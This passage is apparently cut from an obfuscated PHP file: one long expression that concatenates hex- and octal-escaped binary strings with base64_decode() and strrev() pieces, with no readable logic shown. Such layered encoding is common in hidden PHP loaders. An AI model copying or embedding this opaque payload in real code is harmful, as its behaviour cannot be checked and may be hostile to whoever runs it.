xc1\xb4\x9e\x1d\x7\x7a\x6f\xde\x2c\xa0\xcd\x9a\xe6"."\x30\x15\xf8\x5c\xd9\xce\x8f\xc\xd1\xc0\x78\x69\x70\x58\x1f\x5\xfa\x6e\x78\x7c\x42\x1d\x28\x3\x91\x3b\xb3\x11\x3a\x52\x1a\x19\xb5\x32\x59\xa6\x28\x3c\x5c\x1e\xb2\xf3\x30\x88\x72\x2a\xab\x6a"."\31\310\237\113\215\245\363\346\4\324\144\231\206\66\6\325\146\113\71\325\312\300\4\15\352\371\124\216\315\326\310\230\245\33\343\300\257\316\231\11\375\157\154\230\15\223\4\103".base64_decode('zI9k1GwOGp0zG6ZsBqM6U6MD+fEsJGcHjYI2AS3ny+mh4QEgz2fBeHKGnbGYimDT')."\x2c\x68\x63\xf6\x1c\x68\x74\x20\x33\x92\xcf\x32\xf6\x7d\xa8\x64\x94\x27\xb8\x6c\xae\xa8\xe7\xca\x26\x74\x7d\x5e\x23\xb4\x3e\xa7\x11\xe0\x60\x4c\xcb\xeb\xe3\x43\x50\xaf\x9a\xb1\xc7\x4b\x23\x10"."\30\121\47\312\246\6\354\325\354\206\71\220\245\234\265\307\46\40\313\314\31\320\374\214\31\320\241\214\126\66\355\161\126\150\46\44\33\231\61\155\310\146\302\5\4\172\203\114"."\250\60\163\56\324\73\212\350\165\113\145\327\65\326\310\230\236\205\305\36\55\17\214\350\103\114\45\277\11\372\315\176\33\331\304\146\7\7\206\112\26\114\141\121\35\30\34\32".base64_decode('Bd5oNsvS2Aj9GVWHjfECVDlr5kwGC1Z5iF1az2YA2jQXkmfMncUmcQYDNliwcV0d')."\x1a\x63\xca\x78\xb9\x74\x39\x35\x1\x75\xf\x1b\xa3\x63\x19\x6\x5e\x33\x67\x41\xf3\x45\x6b\x28\x33\x3c\x1\xa2\x65\xbb\x94\x1e\xc9\x32\xa6\x79\x56\x13\x64\x29\xd\xd8\x43\x13\xa3\xb0\x6a\x69".strrev('*à'."\0".'ù°7f›ª`óÛ 3•Cñ¢-JZn$L&åŒ.„hÌf¨¹Ò\'²™ë;0hs').base64_decode('aoMDGTZdg5ZeLIyyJZwBhWbMho95rItj6VTBKkIXx1Mjo2aayQ2LppFLw96bOaeR')."\55\65\174\230\271\261\201\162\32\320\114\43\364\156\56\113\315\151\231\11\43\5\223\71\217\1\130\261\244\333\326\30\64\66\234\37\233\30\30\145\73\176\306\134\266\76\260\142"."\263\30\112\231\307\326\173\56\153\45\223\53\15\163\145\330\211\314\220\76\154\302\234\315\233\5\213\72\147\16\314\316\354\171\260\360\305\234\232\312\63\234\66\136\266\55\103\205".base64_decode('qZrF9nwupaULBgB441yY1nRuyB4tM7MJvTg8XoBFn9vAWpsFvVdThfFyBpa1cQZM')."\306\134\326\231\361\234\126\122\13\320\327\46\30\315\234\106\130\223\71\14\130\163\143\305\101\265\4\232\37\145\255\140\345\323\320\142\266\144\17\353\3\114\367\165\314\34\51\217".strrev(''."\0".'›6èñ<˜çMX·½€Y[ 3ÊŞØ3ã64eõdÌ«]6¬™ˆ0Ú')."\x81\x9b\x16\x15\x7d\x5\xb5\xc8\x75\x80\x3a\xa1\xdb\x69\x59\x1d\x5d\xce\x90\xd3\x34\xa6\xd2\xcc\x54\xa5\x85\x92\x89\x55\x26\xc6\x1c\x10\xaf\x17\x34\x21\x58\xcf\xa4\x84\x20\x1\x4b\x66\x24\xd5"."\24\34\214\313\45\323\105\133\112\106\41\107\152\334\66\114\256\14\103\325\354\174\270\127\76\347\70\33\140\365\252\334\223\202\230\330\262\106\15\23\246\43\147\144\322\171\243\234"."\161\324\232\111\71\352\344\261\114\362\341\116\31\330\103\74\252\307\241\111\314\342\34\23\224\42\53\226\224\3\76\66\305\51\151\65\251\204\337\126\255\234\117\216\366\312\251\172".base64_decode('EfUin/c5rSGT5A/MAbW4s7ThslYUd+xWTpp4bMbY051MBOJLJV1EbGbHQCgplMal')."\x61\x89\x1a\xa4\x79\x94\x57\xd0\x39\x5\xec\x32\x6b\xf7\xc6\x4d\x3b\x2e\xb9\x6a\xe7\x95\x77\xef\xbc\xe8\xae\x1d\xf\x5f\xbe\xfb\xae\xbb\x77\x6c\xbe\x12\x5\xb7\x3f\x78\xf1\x8e\xbb\x6e\x78\xe3".strrev('pÜîwƒû`¿n»yØıŞm7ÛyëqßnæÖ}Ül—Âä|ÿ}Ş}ßOöÑx?¶sÚ')."\376\216\163\36\330\276\351\252\35\337\271\151\307\171\227\354\274\374\242\355\233\67\240\374\73\277\43\152\106\331\166\334\171\15\56\373\310\231\73\36\174\160\367\315\267\363\324\177"."\x3e\x72\x6\xed\xc\x3b\x3b\x3a\x34\x1b\x5b\x27\x32\x5\x33\x32\x3b\xca\x42\x5\x0\x52\xb3\x7c\x4a\x77\x5e\x43\x33\xac\xa4\xb3\x5a\x3a\x87\xb5\xd1\xec\xac\x66\x2a\x36\xd1\x4a\x53\xd1\xdf\xa2"."\121\364\122\200\243\226\237\226\242\27\161\262\302\326\306\307\201\62\241\25\112\30\264\140\226\374\324\72\314\241\236\56\301\137\265\151\246\11\125\300\12\317\265\130\253\72\374\11"."\27\204\130\20\251\14\250\50\42\323\254\14\240\142\12\63\362\120\154\203\175\27\306\371\242\273\66\101\325\145\345\335\140\113\73\150\63\210\21\242\150\350\230\144\166\100\357\175"."\x2a\x40\x8a\xec\x2a\x27\x4a\x70\xec\x37\x27\x32\x91\x93\x9c\x33\x1\xb2\x62\xa2\xe0\xe0\x51\x68\x57\x3c\xa\xb9\xd6\x56\x9c\xa6\x90\x58\x61\x81\x29\x1\xc8\x7b\x4c\xee\xbe\xa9\x95\xf2\xd2\x95"."\125\151\274\352\44\312\275\221\357\324\135\103\213\127\231\106\76\70\107\42\332\327\145\273\112\106\171\266\35\167\314\106\153\36\41\72\161\317\112\124\16\304\60\150\120\310\304\121"."\x43\x1c\x4f\x9a\x5a\x46\x67\x5a\xd4\x5a\x81\xe4\x4\xfc\x48\xad\x4a\xb8\xfa\x76\x1a\x6d\x1\xd3\x71\xa1\xb6\x60\x51\x29\x5b\xc2\x86\xe4\xf6\xfc\x45\x60\xb0\xa\x17\x94\x49\xa9\x5d\xf8\x16\x56"."\x32\x72\x6c\xde\x7d\x49\xc7\x37\x4c\xdb\x62\xc9\x9c\x1b\x67\x6b\xf6\x7a\xbd\x92\x20\x5a\xe8\xcd\xe1\x2f\xa8\x4e\xdc\x64\xa3\xb8\x20\xde\xcd\x7b\x8a\x6f\xe3\xa\x20\x68\x9b\xf\xe\x6a\x96\xdd".base64_decode('TMzMlOkK6uhcXyP6IBtilm8O+iSzBJu4ryh1in7OL1vMDqRczLNY9ImyxBD3h0bY').strrev('s4Z0/—•&®rí•£ìin˜DæZéN©F\'Ê¦'."\0".'f"İ´ÕóB¥Á¢	ì').base64_decode('RJcWzhGo0pLsamMCNnBxMglfUNSWF7KEiIsiV6K18irjQyxEcehFjUNV2eK3LosD')."\xf1\x50\x6b\xb2\x3b\xc0\xcc\x43\xd4\x52\xc9\x6f\x65\x72\x96\x1f\x2b\x6f\xea\x23\x5a\x58\x4f\xf9\xb1\xc1\x2d\x6\x12\x1f\x37\x49\xc5\x5b\x43\x6c\xed\xa4\x3a\x0\xc6\x88\x21\x48\xc7\x6a\xec\x49"."\x74\xee\x5b\xd2\xe6\x4f\xe\x6a\x76\x12\xc8\x1f\x46\x8f\x60\xdc\x9e\x54\x53\x86\x69\x4b\x3b\x20\x99\xd1\xa1\x73\xe1\xd0\xe2\x64\x5b\x28\x26\xd5\x51\x2a\x57\xd4\x21\x39\x52\x8\x74\x87\x92\xf1".base64_decode('eFQaDjEjXJFcGm1LtkajS0MA3LDwzRL+xQZo4jIdh4QhGr5/khXvZAIHW7rjQzyu')."\x80\xfa\x2a\xda\x45\xad\x9d\x81\x18\x37\x1a\x98\xe5\x6b\xf0\x35\x8a\xbc\xa8\xc1\x24\xb6\x9d\x68\x61\x56\xb5\xf1\x44\x20\x56\xc5\xdf\x1\xf5\x83\x0\x40\x1\xbe\xf\xa0\x40\x67\x74\xb9\xd2\x1a"."\15\367\164\105\342\324\314\237\306\107\242\122\72\121\15\207\144\346\15\241\62\31\252\17\166\207\3\255\101\45\24\111\104\231\355\7\327\316\45\126\77\161\36\146\123\140\132\32".base64_decode('93YA5WlAtkySa+Q1wTbq9dT21fRN66vrq1/j67P6AY2RFdHl5dFlIOO7nCv1dLfB')."\xb0\x9b\xf9\x57\xc6\x2\x30\xec\x8a\xc7\x4f\x1\x13\xb7\x68\x2c\xd0\x1a\x66\x5d\x44\x40\xf\x9f\xd1\xd6\x10\xfd\xd8\x75\xc5\x3d\xdb\x1f\xbe\x78\xd7\xf5\x77\xed\x38\xff\x22\x54\xd1\xce\xeb\xce"."\xdc\x79\xf5\x3\x88\x30\xc2\xc4\xd0\x5d\x17\xee\x7a\xf4\xe2\x9d\x57\x6c\xdc\x79\x21\x10\x31\xca\xee\x8d\x3f\xdf\xbe\xf9\xb1\x5d\x57\xdc\xbe\xe3\xae\x6b\x76\x5e\xf5\xd0\xae\xeb\xce\xa6\x9\x6f"."\xfc\xf8\x9e\x1d\xdf\xbd\x9d\x77\x4c\x79\xe3\xf2\x47\x77\x5e\x7c\x1b\x27\x90\x28\x5d\xe4\x41\xa5\xdf\x38\xe7\xa2\x5d\x9b\xef\xc2\xe4\xd1\x2d\xa7\xef\xbc\xff\x82\x9d\x1b\x2e\xda\xf1\xdd\x9b\x77".strrev('ĞLM‡[ôzò:k>öZk>êÿQ+%²÷'."\r".'tO+Æ÷h½Î;YÁøî7‹®û{\\').base64_decode('L9OUJ9rTp/QEI61Bt8mWHAQXEtMo5FCFH6BlLXBBwcLEEr2ldo+9WAdwIXVK6kxb')."\60\336\32\13\55\16\202\21\3\137\250\51\204\232\3\155\17\24\33\217\55\343\337\334\112\261\302\345\207\122\307\200\274\136\161\14\104\365\245\215\174\271\120\44\235\125\152\260"."\x7e\x4b\x8d\x7\x23\x33\x62\x3f\xa6\xd4\xe0\x13\x1b\x45\x68\x69\xb4\x25\xeb\xb0\x9f\x0\xa2\xf6\x5c\xbb\xb2\xd6\xd3\xe0\x69\xac\x57\xc0\x1f\x8\x2d\x1\x5e\x40\x94\x1a\xd0\xa5\xe7\xe5\x1c\x8d".strrev('ğëôyx£ÃÚJ[os6Ë9a‘]Ü°è:¨¥§4“ïQ^b_ jå)©^¡§£PRx')."\354\221\366\211\22\164\235\120\16\167\234\22\210\264\71\163\122\207\40\335\265\104\257\64\355\263\271\303\1\266\314\265\365\112\12\114\103\252\44\222\142\216\311\150\161\114\106\335"."\x74\xc0\x1f\xdd\x1d\x7c\xbd\xa9\xdd\x87\x42\xcd\x2\x69\xb7\x54\x8b\x2d\x14\xc4\x92\xa5\xc2\xb1\x74\xb5\x58\x5e\x3\xd\x3\x2d\xe\xcd\x8f\x3e\x78\xa\xb6\x90\xe0\x35\x21\x34\xc5\x13\xd8\xa"."\xe2\x78\xbe\x88\x55\xd2\x88\xa7\x96\x1a\x4a\x71\xd2\x71\x16\xac\x41\x86\x2\xc1\x43\x48\xd7\x4a\x3e\x6\x6\xcb\xb0\x4\x9a\xf0\xf3\x82\xd\x1c\x83\x89\xd6\x4e\xa\xe5\x71\x9\xcc\x33\xa9\x29"."\xe\x40\x15\xd3\xa9\x38\x40\x84\xb3\x2d\x90\x8f\x6e\x17\x8c\x10\xe\x20\xf9\x42\x91\xf6\x68\xac\x8b\x1a\xf6\xc5\x5b\x3b\x83\x5d\x1\x1f\x20\x77\xa\x9\x34\x3f\xa6\xeb\x94\x16\xa5\x16\x63\x3e"."\32\125\353\230\176\322\20\233\262\4\151\25\355\253\244\215\210\64\72\13\245\101\350\14\254\276\102\214\267\125\122\244\245\226\372\126\200\52\271\103\242\150\54\221\104\23\0\350"."\131\302\272\265\322\51\42\251\304\143\373\264\21\306\157\14\40\372\314\140\56\45\62\51\346\267\10\125\216\353\154\215\106\332\103\314\206\261\15\270\371\22\223\173\103\246\266\130"."\x8\x1b\xef\x43\xfb\xa\xab\x4a\xb2\x1c\x45\x1\xa1\x5b\x82\x2\x25\x26\x76\x47\xdf\xc2\x22\x1d\x27\x70\x5a\x0\x5\x4\x29\x80\x2\xfc\xb0\xc1\xb9\x24\x7\x4b\xb8\xfd\x78\x84\x7f\xb\xc2\x1a"."\5\260\176\245\300\276\313\333\370\167\47\67\100\306\11\321\230\24\10\304\2\135\161\36\214\55\347\266\60\74\216\332\304\44\43\75\135\2\343\207\3\313\20\260\104\331\174\63"."\x6e\xc7\xbf\xba\xce\x37\x6d\x51\x7d\x1f\x35\x33\xa4\x9f\xf4\xe7\x64\x16\xc2\xa6\x57\xfd\x6b\x1b\x3d\xca\xec\xf5\xf5\x90\x87\x19\xe6\x25\xed\x2c\x3a\x7e\x93\xa2\x95\x53\xc2\xc9\x70\xb4\x83\x86"."\x89\xe3\xa7\x60\x31\x23\x78\x1f\xa5\x57\x41\x4\x79\x42\x10\xe4\x16\x3b\xba\xf8\x6e\x50\x10\xc\x2b\xd4\x76\x59\x89\x44\x97\x7\x84\x2f\x21\x29\x1\x62\x84\x6b\x21\xff\xea\xde\xbe\xd1\x3e\x1f".base64_decode('IiKsNcJssG2xwsiTViI7oCIGKB1gx+gaD5wYybwxyPyCIIS4DsgF+ruCfRBcCQUQ').base64_decode('Q13KM/tBariY7FvXN7XP66O2mpio6fOILiWDK9AZG487DE2TxF0O1I5GCV9019LA')."\2\370\1\116\157\1\220\255\20\134\330\302\27\63\170\312\272\10\372\333\221\130\27\104\177\303\350\47\234\100\313\245\363\14\150\113\206\103\113\203\353\360\77\42\241\236\117\44"."\x35\xc9\x72\x16\x8\x45\xd6\xa1\x7f\x11\x82\x59\x17\x8a\xb8\x2b\x5b\x1c\x4c\x2c\xf\x6\x69\x6\xf6\xd\xbf\x22\x2b\x42\x38\x30\x54\xc9\x31\x18\xb6\x79\x80\x64\x61\x3\x1\x55\x27\x93\x75\x64".strrev('…-ÓÚ,Gp‚»»8(Xa* ¯±Ç]o$3…¬nNÕÔ5]ÂğÕ¿I“ëÓı½2').base64_decode('OwPLQpEOFvJPY1/ToGqlLRRHU9TKgFF44ZLD9JuSRTI17ADpNoTZUUAi5TGTQDGz')."\163\227\55\356\11\205\333\144\333\172\234\221\176\115\41\130\35\316\224\51\254\163\54\114\254\354\131\0\117\71\373\46\340\306\2\144\16\130\200\116\0\13\221\351\142\1\342\355"."\213\5\310\100\131\0\163\55\301\10\113\103\274\53\342\73\31\103\232\125\107\270\161\350\374\114\112\162\344\200\161\260\217\112\345\260\67\17\304\335\251\134\166\352\22\274\22\31"."\230\44\146\240\172\210\212\144\243\356\247\121\210\332\44\221\350\267\157\315\42\102\15\257\141\200\111\15\241\355\204\156\347\35\255\200\301\44\152\45\104\254\124\245\166\230\225\10"."\x91\x38\x26\xd\x49\xea\x4d\xe\x6a\x39\x42\xc8\xb8\xa8\x88\x1c\xc4\xc9\x42\x54\x84\xf5\x2f\x89\xa0\x99\x6\x9d\xac\x15\xc7\x4b\x6b\x38\xc7\x4\xce\x25\x3c\xf0\xb\x3d\xfa\x3a\xfd\xe9\x83\x20"."\x13\x91\x80\xe5\x4f\xad\x7\xe\x59\x66\x2d\xe2\xe4\x9a\xfb\xfa\x6a\xf6\x34\x5b\x90\x81\xcd\x19\x4\x6b\x68\x90\x95\x82\x89\x44\x67\x5e\x3a\x8b\x1d\x82\x24\xed\x2\x13\xb1\x13\xa6\x4d\x8\xb3"."\251\100\134\204\333\142\321\156\112\201\50\241\166\205\272\233\120\152\251\10\275\26\110\253\326\130\20\357\16\232\213\245\325\325\72\204\137\13\153\25\260\75\257\167\226\12\105\332".base64_decode('giuUWj0zllTVJBRW0F5kFSkVNbEaaF/h8srKGqOKDF6Mj26lcQkBchWkGXEcwex8').strrev('êG'."\0".'X‰ÁI¢+@–"¡U'."\n".'ƒæbGßîzÈL-ÒJ)0áØP¤ÓJó¬À=')."\363\300\3\320\37\202\120\60\167\144\26\124\152\374\112\150\66\337\32\20\36\254\161\220\210\224\170\304\104\42\100\20\71\362\244\61\361\24\42\101\240\323\54\313\27\226\2\325"."\x4d\x43\xdd\xb1\x50\x57\x20\xb6\x12\xa6\x4c\xf0\x0\xb0\x3\x8d\xbc\xc3\x4\x5a\x4\x74\xab\x47\x32\xc2\x8f\xa0\x5e\xcb\x46\xf9\x74\x8d\xd7\x31\xc\x8b\xf8\xd9\x75\x80\x61\x51\x6f\x60\x3\xe0".base64_decode('laef4JwxyW2smXCljtkqe9gH83VBbLpgn1oFhHJ4SKwawD6sipwqW6UJ75H4kMSL')."\xc\x1b\x20\xd8\x1e\xe8\x9\xcb\x31\x30\x55\xca\xd2\xe0\xca\x2f\xd8\x23\xac\xa7\xd5\xf6\x8\x4b\x63\x62\x1a\xbe\xdb\x60\x3c\x75\xb3\x60\x7c\xd4\xfd\x46\x5d\x13\xe2\x49\xcb\x45\x4b\x1f\x2c\x72"."\xdf\x75\xd0\x2b\x1a\xa\xf4\x24\xa2\x49\x74\x7e\xc4\x82\x18\x9b\xc3\x88\xf8\xb4\x4a\xfd\x95\xf8\x6e\x79\x51\xa0\x1a\x9c\x81\xbb\xe2\xfc\x82\xa1\xb1\x3c\xd5\x86\xc6\xcb\x73\x89\x54\x30\xd2\x11".base64_decode('igRbusZD8UCXwjoOMjfssW4u1BOKJsOIJk7KYrVQFETKvpTseyUpXLj4VKGTbptl')."\xc9\x63\xa2\x6e\x10\xdd\xf0\x2e\x6e\x34\x42\x14\xd6\x11\x40\x4\x84\xeb\x6\x2e\xf6\x26\x69\xe5\x14\x2e\x2d\x1f\x57\x50\xde\xe5\x75\x50\x37\x9a\x71\xa\xce\x4c\xa9\x94\xf9\x22\x7b\xd2\xd1\xb8"."\x5b\x39\x5c\x8e\x16\x7a\xea\xfc\x6e\x86\xa9\xc7\x23\xb4\x56\x70\x14\xe8\x91\x5c\x2f\xa8\x19\x28\x87\x6b\x51\x58\xcb\xe4\xd2\xa8\xe8\xec\x27\x3a\x38\xf3\x49\xec\x5\x5\xf1\x85\x49\x4d\xc\xab"."\240\131\26\277\72\46\134\20\373\264\263\302\5\205\354\375\261\155\61\233\302\162\321\216\153\171\320\247\150\113\21\15\177\141\263\47\254\235\44\315\177\162\17\43\326\205\372\341"."\x74\x15\x84\x9a\x42\x7c\xe0\x52\x2e\x11\x19\x16\xee\x1e\xf1\x15\x88\xa8\xb3\x9f\xf1\xf2\x62\x90\x13\x7a\xc9\x7d\xe7\x51\x34\xba\x35\xb3\xa0\x93\xbb\x9d\xe5\xc2\xac\x88\xa7\x4b\xa5\x89\x7d\x18"."\xb3\xbe\xab\x3a\xb9\xe5\x22\x6a\xa1\x9b\xaf\xac\xb7\x91\x65\x66\xfe\x7b\x9\x1c\x29\x9c\x91\xe5\xb6\x32\x68\x49\x49\x59\xc9\x98\x82\x10\x53\x50\xad\x9\xb7\xac\x27\xba\x3a\x67\x1b\x46\x97\x5a"."\34\117\30\313\164\15\240\267\55\272\74\22\216\62\57\165\314\305\45\15\15\202\242\17\242\134\114\37\13\330\354\303\144\266\142\313\31\171\217\251\16\311\355\361\211\62\14\220"."\305\24\60\31\210\265\166\42\126\75\331\36\102\147\15\72\310\104\5\235\250\250\141\216\113\313\44\305\166\61\307\115\340\32\63\154\14\362\115\216\110\71\160\117\346\330\350\241".base64_decode('KJT1adgsipqmYNM1XpC65vryQj2Sd9A97M2q5VohI2/QJHKXL28wponjExUjVmhf')."\x5a\x48\xe0\x2a\xd2\x12\x29\x24\xe1\x37\x57\x19\x2\x40\xd4\x86\x6\xd6\x3a\xb\xc9\xc2\xd3\x12\x42\xaa\x91\x68\xb2\x13\xe1\xed\x28\x3b\xdd\x75\x2b\xe1\xc0\x93\xac\x14\xec\x56\x1b\x11\x1f\x69".strrev('ÌeŞÿÜÙ£#5AÇQxÈYYı'."\0".'ÕN&ğ'."\n".'e1(E­À‹W¡ø¹>iŞû±?').strrev('u°XÚsuØÄöÓ|]N[‡qÁÊ”0-:$Ætl4GT<9*5p.š²Y÷')."\45\277\201\340\261\355\201\145\356\30\274\7\22\201\216\252\321\134\210\204\343\11\267\226\214\105\261\264\55\30\156\167\25\210\167\162\177\225\316\270\144\70\24\131\132\65\1\235".strrev('‘×š7a-o®º¿Ò4ueI'."\n".'‰Á3•¢‡%*Ú8qxE¼AâÎqÜ»JR]ù').strrev('ğÏ¿!-$X2>wfıá‹h‡»xd‰ñE\\i¾Eş}uõõ¾¢ız²oz™‡Y').base64_decode('f5+fO/1iaBScCMepeyRHL1x+Q5hBvs/tHzNEryyT8ZVxPtsUFKulO+CLZpM1E1yZ').base64_decode('0d9uOStWhqma0QGgDvNlOcqnG2IviE2bMdJl7IFJzLg4ZlCUz1EFQtc5wQ3Dnouz').strrev('#ı5D¦óÀÔeâ€À—f'."\n".'¹X¯–Ë=Å‰O»DŠîY-èë¸ˆ­ˆœÇDY½')."\314\143\364\62\114\233\153\226\137\246\171\170\44\32\43\102\167\14\131\371\51\313\316\123\61\156\360\127\117\242\265\371\13\105\273\161\17\71\272\115\55\145\30\366\36\122\227\165"."\x7d\x71\xc5\x90\xd8\xdb\x67\xf5\x33\x98\xf3\x67\xb4\x11\xf8\x14\xda\x67\x96\xe0\x48\xe0\xbc\xf6\xca\x9e\xab\x31\x78\xca\x84\x57\x26\xe5\x3a\x7c\x21\x42\xdc\xa8\x4a\x47\xb4\x88\x6c\x62\x6a\x7f"."\x2b\xbd\x5\x6f\xa6\x2f\xd1\x81\xdd\x6b\xf6\xad\xe2\x6b\xad\x9b\x92\x7f\xcb\xb4\x51\xcc\xe8\x92\x7\x5\x35\xcd\x68\xac\x72\x3a\xc7\xdd\x15\x60\xec\x6f\x79\x47\x75\x6\x4d\x93\x39\x9b\x6\xda".base64_decode('T0k1TdlWSfNv2Iu5Fq+aHzQQvZUtsFg150gXnlNLRl5nLu+GvagJKY1mRpWzMxTr')."\x2d\x70\xaf\xb3\x38\x60\xf1\x90\xbc\xc5\xc8\x29\xc3\x95\x74\xf0\x59\xd6\xe9\xda\xd1\x3c\x92\xfb\xc4\x8d\x93\x41\x34\x2b\x33\xc1\x71\x74\x3b\x22\x7c\x33\x2\x2f\x30\xd7\xbd\x82\xbf\xc4\xa4\x13"."\361\225\114\203\36\105\270\234\147\142\315\352\164\35\361\264\43\250\345\264\354\136\201\41\343\102\116\334\246\27\162\134\341\42\355\40\116\60\35\40\102\246\104\177\200\367\167\224"."\xb6\x78\x9c\xa9\x5e\x81\x69\xea\xe2\xf1\x98\xf4\x78\x85\xc3\xcf\x85\xec\x2f\x3f\xb0\x3c\x3e\xd3\xdb\xd9\x15\x68\xf5\xa2\x23\xa5\x89\xe9\x8e\xa3\x83\xbd\x2f\x81\x4e\x76\x6\x58\xea\xa8\x35\x93".strrev('UeŠ©ªêa #D]cI%aƒ-M¦ª]If7§díÒ¦ V‹%lúf4ñ').base64_decode('3mE8DPpVrd0VVdtdUa3dFa52V1S2S6NcEKuWSq1ZDAsObOqISssBdpINYAUdWV0I')."\44\240\124\7\330\207\222\333\50\121\235\341\371\55\361\305\167\305\200\264\137\34\325\371\0\345\103\161\77\276\374\247\237\171\325\262\227\71\74\56\175\251\37\144\354\53\244\213"."\263\101\234\166\365\33\226\345\307\136\42\11\305\316\225\335\242\161\166\307\343\34\23\325\24\222\230\161\160\124\307\235\370\162\27\277\302\17\60\25\315\323\357\40\167\230\203\30"."\x8f\xc0\x20\x76\x81\x82\xf0\x1c\xcc\x4a\x70\xac\x64\x58\x9a\xec\x60\x3a\xa3\x11\xaf\xa5\xdc\xe6\x5f\xf2\xd6\x5c\x50\xc7\x30\x26\x62\x3a\x80\x92\xdf\x66\xe6\x5\x59\x76\x19\x89\x27\xcc\x5b\x70"."\xf8\x99\x1f\xf3\xa2\xa1\xbb\x3c\x1f\x5b\x9a\x96\x63\xc\xa6\xc4\x84\x70\xa1\x40\x37\xf7\x68\xec\x1e\xe\x46\x5\x2\x29\x9a\xdc\x9b\x35\xbd\xd5\xf5\x56\x8d\xf0\x4a\x5e\x34\x28\x36\x90\x3c\xa2"."\243\176\101\325\270\233\260\177\263\144\156\230\40\201\376\254\252\66\152\257\51\134\114\243\265\244\357\30\54\325\306\231\373\146\327\16\160\171\174\356\353\350\353\352\113\310\323\144"."\233\352\300\0\352\266\344\104\326\321\27\341\140\32\300\217\74\75\300\46\143\317\356\251\341\362\142\152\125\357\326\220\110\270\16\277\111\224\345\74\243\111\16\271\344\15\223\52"."\xb0\x7b\xa\x8e\x7\xe8\x1d\x10\x1a\x76\xa5\xb2\xf4\x8c\x8e\xc\x2f\xf8\x18\xe7\x8a\x70\x58\xa8\x40\x9d\x82\x33\x94\x41\x9c\x75\xc3\x63\x0\x2d\x6c\x44\x68\xea\x8a\x8b\x8d\xc\x9c\x89\x6b\x6b"."\20\44\326\64\327\114\256\103\277\365\65\236\32\114\234\222\60\136\105\34\101\372\121\323\74\271\216\174\324\203\63\233\11\260\335\220\374\345\212\33\163\20\47\54\102\123\53\135".base64_decode('8ywis4H3fpO/yT8K+GDRMG5RvOjhPgPGkgjtseuLpIx8Aa3DrMspnbwnDC13tUH1')."\53\274\201\256\125\136\341\301\172\301\242\261\102\136\1\116\263\245\266\321\327\120\253\260\27\137\132\152\173\22\355\336\271\265\213\26\36\270\240\225\134\372\332\132\27\276\265\305"."\336\301\251\0\140\41\134\312\54\300\333\213\7\374\316\320\236\312\2\374\25\324\11\243\210\216\72\204\241\12\276\64\114\146\17\307\142\302\251\170\121\263\107\15\23\156\264\1".base64_decode('wTY1zJRhGkDEYlub+LFoxnJMNvye0ni56MViCG9c9m7oesagwZkfCxKc+WXUmBbo')."\243\40\76\351\223\24\315\212\374\116\211\344\262\331\213\151\2\272\53\231\114\13\342\60\326\144\121\272\354\0\233\301\65\106\211\111\47\112\74\331\325\137\74\325\136\104\164\141".base64_decode('+EebCh2/tlYti/MxDPcTGe5ZIEXw4nrltzfGEMWNk7EXfi9eXy9z11iZIjZ11a6m').strrev('J¼Ú=³Ò¸Ü’÷wœÖ´UÌ ç×ˆD,ó*V«³.[À‰D“wë)éeªT').strrev('Dù@†pï‘¦-À*z\\†ÆÁ¼@x`èŸß<Éôk}1.Q¦Tçi™šóYæŒÓ')."\157\35\357\256\300\100\51\317\56\75\151\100\4\334\164\47\141\315\240\44\177\2\242\12\46\105\314\30\200\150\21\216\135\111\55\225\57\310\40\373\60\171\176\125\154\221\124\76"."\47\106\222\302\252\345\0\341\71\324\121\103\220\131\344\310\225\244\311\351\154\271\230\153\221\22\25\333\60\224\202\132\34\7\156\140\212\325\74\305\232\217\33\152\231\342\233\71"."\x60\xa1\x0\x4d\x10\xe\x7f\xf1\x39\x22\xdc\x33\x52\x77\x41\x90\x42\xc5\xf9\x3e\xfc\x5e\x8b\xf\x1f\x52\xb1\x32\xe4\xea\xce\x97\xf9\xdb\x1a\x25\xf2\xd\x3d\xec\xe\xf7\x74\x84\x22\x92\x2\x93"."\x14\x91\x6c\x6d\x8b\x24\x3\xdd\xdd\x55\x13\x60\x25\xa8\x90\x10\xdf\xfe\xfb\x86\xd8\xa5\x48\x9a\x41\xd5\x2\xbd\x30\xa8\xa4\xb1\xbd\x45\x4b\xd\x8e\xad\x51\x2c\x33\xcd\xdc\x1e\xd7\xf8\x1\x8f".base64_decode('kgyCf1qgQ5FaXEQZQGDiJV80uXbhAr++kE+2cM5kGsKcxOc/CXNTfqwiVJyKV1fW')."\130\40\261\355\302\25\223\242\54\120\25\72\217\55\265\130\177\143\240\126\311\242\363\230\353\107\56\164\27\216\260\153\243\5\176\125\116\304\73\53\146\60\362\227\63\121\43\134"."\x50\x5f\xf5\x6\x22\x20\x39\x49\x27\x6f\x65\xb4\xaa\xc5\x65\x95\x45\x70\xe5\xbe\xb4\x9c\x44\x57\x92\x18\xbc\x54\xe6\xf7\x13\x49\x80\x5f\xf0\x8b\xce\x2b\x19\x7e\x8b\x51\x5\x28\x7c\xe2\x55\x2b"."\x35\x9d\xc3\x10\x25\xd0\x3f\xb4\x9\x9\xdd\x98\x45\xa1\x9\x8e\xc7\x1f\x6c\x49\x45\xa3\x8c\x8d\xbf\x88\xa0\xdd\x14\x2f\xd4\xac\x5d\x4b\x2b\xc2\x27\xfe\xfa\xf5\x95\x71\xa0\xe5\xe9\x4e\xa\x94"."\164\167\24\206\34\167\34\146\271\105\34\72\307\234\315\120\250\225\63\211\30\226\207\376\212\62\341\110\207\10\120\226\304\221\330\313\24\252\111\250\257\267\326\67\155\375\172\277"."\316\164\241\230\336\6\53\353\343\271\151\270\317\347\314\217\106\2\123\317\63\102\204\73\47\245\37\227\300\346\73\320\77\115\30\254\161\235\47\5\53\102\265\264\54\354\345\367"."\72\375\54\215\21\201\172\343\134\266\374\23\131\157\142\71\377\154\215\10\62\227\3\71\305\47\76\42\56\11\70\35\44\57\32\341\157\257\320\131\225\277\3\245\222\34\144\17".base64_decode('CpE7hrye8vPdTu8dfGlh58WyEFzjiscKS64EbBBDokcQMkRU15A7HtXFI/nHAitt')."\352\45\333\201\247\350\163\213\65\344\155\234\41\165\104\245\131\152\24\340\317\133\152\310\333\0\65\10\57\321\24\100\10\242\53\13\60\2\122\114\55\337\122\103\272\153\145\65"."\xd\x95\x27\x28\xa6\x5a\x23\xa8\x60\x8d\xc2\xb0\x63\x41\xe5\x33\x66\xda\x6\x3a\xf8\xb8\xc5\x11\xbc\x54\xd5\x13\x3\x53\x88\x40\x4\xee\x75\x80\xa4\x3a\x69\x35\xfd\x9d\x7c\x12\x3\x14\xf2\x6c"."\132\136\63\251\276\67\301\72\344\246\157\100\310\264\340\341\254\356\130\64\21\155\145\357\14\125\23\176\315\144\364\253\260\42\202\176\122\223\71\301\367\60\353\36\256\46\